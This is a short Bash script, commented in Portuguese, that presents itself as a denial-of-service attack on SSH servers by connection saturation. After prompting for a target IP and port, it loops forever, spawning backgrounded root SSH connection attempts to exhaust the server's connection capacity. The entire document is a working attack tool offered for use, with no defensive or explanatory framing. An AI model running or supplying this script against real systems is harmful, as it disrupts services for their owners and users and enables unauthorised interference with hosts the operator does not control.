#!/bin/bash
#
# ATAQUE DE NEGACAO DE SERVICO SSH POR
# SATURACAO DE CONEXOES SSH
#
f_loop () {
	ssh -l root $IP -p $PORT &
} 

#
COUNT=0
while [ $COUNT -eq 0 ]; do
	echo -e -n "QUAL A PORTA VOCE QUER SE CONECTAR USANDO TCP?: "; read PORT
	echo -e -n "QUAL O IP QUE QUER SE CONECTAR?: "; read IP
	echo -e -n "AS INFORMACOES ESTAO CORRETAS? [s/n]: "; read CORRETO
	case $CORRETO in
		s|S)
			echo -e "VOCE DIGITOU= [ IP: $IP ] [  PORTA: $PORT ] "; sleep 3
			break
			;;
		n|N)
			echo -e "TENTE NOVAMENTE ..."; sleep 3
			;;
		*)
			echo -e "INFORMACAO INCORRENTA... TENTA NOVAMENTE..."; sleep 3
			;;
	esac
done

while true; do
	f_loop
done

exit 0
